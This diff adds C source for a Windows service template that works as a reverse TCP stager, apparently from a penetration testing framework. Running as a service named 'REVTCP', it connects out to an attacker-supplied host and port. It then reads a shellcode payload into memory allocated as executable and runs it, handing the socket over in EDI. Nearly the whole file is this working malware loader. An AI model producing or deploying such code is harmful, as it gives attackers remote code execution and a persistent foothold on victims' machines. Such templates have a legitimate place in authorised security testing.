@@ -1,0 +1,154 @@
+#pragma comment(lib, "wsock32.lib")
+
+typedef SERVICE_STATUS_HANDLE (__stdcall *RegisterServiceCtrlHandlerProto)(LPCSTR, LPHANDLER_FUNCTION);
+typedef BOOL (__stdcall *SetServiceStatusProto)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
+typedef BOOL (__stdcall *StartServiceCtrlDispatcherProto)(const SERVICE_TABLE_ENTRYA *);
+
+/*! @brief Number of milliseconds to wait before connection retries. */
+#define RETRY_TIMEOUT_MS 1000
+
+char cServiceName[32] = "REVTCP";
+SERVICE_STATUS ss;
+SERVICE_STATUS_HANDLE hStatus = NULL;
+
+
+%{DEFINITIONS}
+
+/*!
+ * @brief Connects to a provided host/port, downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param port Port number to connect to.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+VOID reverse_tcp_rdl(const char* host, u_short port, short retryAttempts)
+{
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return;
+	}
+
+	// prepare to connect to the attacker
+	SOCKET stageSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct hostent* target = gethostbyname(host);
+	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr(targetIp);
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	// try connect to the attacker at least once
+	while (connect(stageSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
+	{
+		// retry with a sleep if it fails, or exit the process on failure
+		if (retryAttempts-- <= 0)
+		{
+			return;
+		}
+
+		Sleep(RETRY_TIMEOUT_MS);
+	}
+
+	// read the size of the payload from the socket
+	DWORD payloadSize;
+	if (recv(stageSocket, (char*)&payloadSize, sizeof(DWORD), 0) == SOCKET_ERROR)
+	{
+		return;
+	}
+
+	// adjust the payload size for the magic EDI value used later;
+	payloadSize += 5;
+
+	char* payload = (char*)VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (payload == NULL)
+	{
+		return;
+	}
+
+	// set EDI to our socket
+	payload[0] = (char)0xBF;
+
+	// put the socket handle into the payload buffer
+	*(DWORD*)(payload + 1) = (DWORD)stageSocket;
+
+	// keep track of the bytes that we've read so far, so we know
+	// when to stop
+	DWORD bytesRead = sizeof(char)+sizeof(DWORD);
+
+	// read the payload in from the network
+	while (bytesRead < payloadSize)
+	{
+		int result = recv(stageSocket, payload + bytesRead, payloadSize - bytesRead, 0);
+
+		if (result == SOCKET_ERROR) return;
+
+		bytesRead += (DWORD)result;
+	}
+
+	// cast our payload to a function pointer and run it.
+	((void(*)())payload)();
+}
+
+
+/*
+ *
+ */
+BOOL ServiceHandler( DWORD dwControl )
+{
+	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
+	{
+		ss.dwWin32ExitCode = 0;
+		ss.dwCurrentState  = SERVICE_STOPPED;
+	}
+
+	return SetServiceStatus( hStatus, &ss );
+}
+
+/*
+ *
+ */
+VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
+{
+
+	ZeroMemory( &ss, sizeof(SERVICE_STATUS) );
+
+	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+	ss.dwCurrentState = SERVICE_START_PENDING;
+	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
+
+	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
+
+	if ( hStatus )
+	{
+		ss.dwCurrentState = SERVICE_RUNNING;
+
+		SetServiceStatus( hStatus, &ss );
+
+        char host[256] = "%{HOST}";
+        short port = %{PORT};
+
+        reverse_tcp_rdl(host, port, 5);
+
+
+		ServiceHandler( SERVICE_CONTROL_STOP );
+
+
+		ExitProcess( 0 );
+	}
+}
+
+/*
+ *
+ */
+int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
+{
+	SERVICE_TABLE_ENTRYA st[] =
+    {
+        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
+        { NULL, NULL }
+    };
+
+	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRYA *)&st );
+}
